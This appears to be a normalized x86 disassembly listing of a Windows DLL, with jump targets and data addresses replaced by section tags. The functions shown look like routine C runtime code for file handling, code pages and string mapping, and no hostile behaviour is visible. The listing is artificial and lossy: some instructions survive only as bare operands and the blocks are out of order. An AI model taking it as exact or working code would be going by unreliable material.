mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_10010502
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_100105a3
pop ecx
mov eax esi
jmp r-xdata
call sub_1000d591
mov [ eax ] esi
test esi esi
je r-xdata
sub_100106bf
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
call sub_1000d588
mov [ eax ] 0x16
call sub_1000d591
mov [ eax ] ebx
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_100102e4
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi __dos_header
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
call sub_1000d588
mov [ eax ] 0x18
call sub_1000d591
and [ eax ] 0x0
mov eax edi
jmp r-xdata
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_1000d515
pop ecx
mov esi edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
call sub_100105a3
pop ecx
mov eax esi
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_10010407
mov eax ebx
pop ecx
sar eax 0x5
pop ecx
mov cl [ ebp - 0x1 ]
lea edi [ eax * 4 + rw-data ]
mov eax ebx
or cl 0x1
and eax 0x1f
mov [ ebp + 0xb ] cl
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
and [ ebp + 0xb ] 0x48
mov [ eax + esi + 0x4 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test cl 0x80
je r-xdata
mov esi ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_1000ee2c
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_1000dc2c
add esp 0xc
test eax eax
jne r-xdata
call sub_1000d591
cmp [ eax ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_1000ee2c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
push ebx
call sub_1000e995
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebp - 0x10 ]
push ebx
call sub_10011299
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_1001098e
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_1000b26e
push [ ebp + 0x8 ]
call sub_10010b3b
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_10010bb8
xor edx edx
mov eax rw-data
push 0x19
call sub_1000b2cf
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jb r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_10010b85
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_10010be1
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_10010b85
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_10010b3b
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_10010b85
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10010bb8
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_10010be1
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_1000d6d5
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_1000fda8
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_1000fda8
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_10010d82
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_10010e0b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor edi edi
cmp eax edi
jne r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push edi
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x2
pop eax
mov [ rw-data ] eax
push edi
push edi
push edi
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x220
push [ ebp + 0x18 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
mov [ ebp - 0x4 ] edi
add eax 0x3
and al 0xfc
call sub_1000a610
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x2c ] eax
push esi
push edi
push eax
call sub_1000fd50
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x2c ] edi
je r-xdata
push edi
push edi
push esi
push [ ebp - 0x2c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x220
push [ ebp + 0x18 ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi + 0x2 ]
add eax 0x3
and al 0xfc
call sub_1000a610
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x24 ] ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x1c ]
cmp eax edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea edi [ ecx + ecx ]
lea esi [ edi + ebx ]
or [ esi ] 0xffff
or [ esi - 0x2 ] 0xffff
push ebx
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ esi - 0x2 ] 0xffff
je r-xdata
mov eax [ rw-data ]
cmp [ esi ] 0xffff
jne r-xdata
push edi
push ebx
push [ ebp + 0x14 ]
call sub_10009830
add esp 0xc
mov eax [ ebp - 0x20 ]
jmp r-xdata
sub_10010fd0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_1000b26e
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_1000b2e4
mov ebx eax
add esp 0x4
call sub_1000b2e4
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_1000b2cf
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_100110da
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_1000e6f1
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_1001125c
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_1000b2cf
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_1000f265
push 0x1
call sub_1000b2cf
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_1000b2cf
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_1000b26e
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_1001125c
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_10011299
push ebp
mov ebp esp
mov eax 0x1004
call sub_1000a610
push ebx
push esi
xor esi esi
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_1000ee2c
or ebx 0xffffffff
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax ebx
push 0x2
push esi
push [ ebp + 0x8 ]
call sub_1000ee2c
add esp 0xc
cmp eax ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
mov ebx 0x1000
lea eax [ ebp - 0x1004 ]
push ebx
push esi
push eax
call sub_1000fd50
push 0x8000
push [ ebp + 0x8 ]
call sub_100113be
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_1000ee2c
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ee2c
push [ ebp + 0x8 ]
call sub_10010502
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi ebx
jne r-xdata
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp + 0x8 ]
call sub_1000ec3c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
call sub_1000d588
mov [ eax ] 0xd
call [ GetLastError@IAT ]
mov edi eax
call sub_1000d591
mov [ eax ] edi
call sub_1000d591
cmp [ eax ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
call sub_1000d588
mov [ eax ] 0xd
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100113be
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
cmp edi ebx
mov eax ebx
jge r-xdata
sub_100113be
mov eax [ esp + 0x4 ]
push esi
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov esi 0x8000
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 4 + 0x4 ]
mov cl [ ecx + eax * 4 + 0x4 ]
mov al cl
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
call sub_1000d588
mov [ eax ] 0x16
or eax 0xffffffff
pop esi
retn
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
sub_10011426
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop esi
leave
retn
cmp [ rw-data ] esi
push ebx
jne r-xdata
mov ebx rw-data
push ebx
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] esi
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
push ebx
call [ InterlockedDecrement@IAT ]
push 0x13
call sub_1000b26e
pop ecx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp + 0xc ] eax
mov ax [ edx ]
cmp ax 0x5a
ja r-xdata
cmp ax 0x41
jb r-xdata
cmp [ ebp - 0x4 ] 0x0
pop edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
inc ecx
mov [ ebp + 0x8 ] eax
inc ecx
inc edx
inc edx
dec [ ebp + 0x10 ]
je r-xdata
cmp ax 0x41
jb r-xdata
add eax 0x20
push ebx
call [ InterlockedDecrement@IAT ]
push 0x13
call sub_1000b2cf
pop ecx
jmp r-xdata
cmp [ ebp + 0xc ] ax
je r-xdata
movzx ecx [ ebp + 0x8 ]
movzx eax [ ebp + 0xc ]
sub eax ecx
pop ebx
mov eax [ ebp + 0xc ]
cmp ax si
je r-xdata
add eax 0x20
mov ax [ esi ]
inc esi
push eax
inc esi
call sub_1001151e
mov [ ebp + 0xc ] eax
mov ax [ edi ]
inc edi
push eax
inc edi
call sub_1001151e
dec [ ebp + 0x10 ]
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
mov ax [ ecx ]
cmp ax 0x5a
ja r-xdata
jmp r-xdata
sub_1001151e
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp ax 0xffff
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
or ax ax
leave
retn
cmp ax 0x100
jae r-xdata
cmp ax 0x41
jb r-xdata
push 0x0
lea eax [ ebp - 0x2 ]
push 0x1
push eax
lea eax [ ebp + 0x8 ]
push 0x1
push eax
push 0x100
push [ rw-data ]
call sub_10011593
add esp 0x1c
test eax eax
mov ax [ ebp + 0x8 ]
je r-xdata
push 0x1
push eax
call sub_100117cc
pop ecx
test eax eax
pop ecx
jne r-xdata
leave
retn
cmp ax 0x5a
ja r-xdata
mov ax [ ebp - 0x2 ]
mov ax [ ebp + 0x8 ]
leave
retn
add eax 0x20
leave
retn
sub_10011593
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
cmp [ ebp + 0x14 ] esi
jle r-xdata
push esi
push esi
push 0x1
pop ebx
push ebx
push r--data
mov edi 0x100
push edi
push esi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1001179c
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push esi
push esi
push ebx
push r--data
push edi
push esi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] esi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax esi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] esi
add eax 0x3
and al 0xfc
call sub_1000a610
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x1c ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x1c ] esi
je r-xdata
push esi
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
push esi
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov edi eax
mov [ ebp - 0x2c ] edi
cmp edi esi
je r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x3
and al 0xfc
call sub_1000a610
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x24 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp ebx esi
je r-xdata
push edi
push ebx
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push esi
jmp r-xdata
mov eax edi
jmp r-xdata
cmp eax edi
jl r-xdata
push edi
push ebx
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push eax
push ebx
push [ ebp + 0x18 ]
call sub_100092c0
add esp 0xc
jmp r-xdata
mov eax edi
sub_1001179c
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
sar eax 0x1
retn
inc eax
mov esi ecx
inc eax
dec ecx
test esi esi
jne r-xdata
sub_100117cc
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0xffff
je r-xdata
xor eax eax
leave
retn
cmp [ ebp + 0x8 ] 0x100
jae r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
push eax
lea eax [ ebp + 0x8 ]
push 0x1
push eax
push 0x1
call sub_10010e0b
add esp 0x18
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
jmp r-xdata
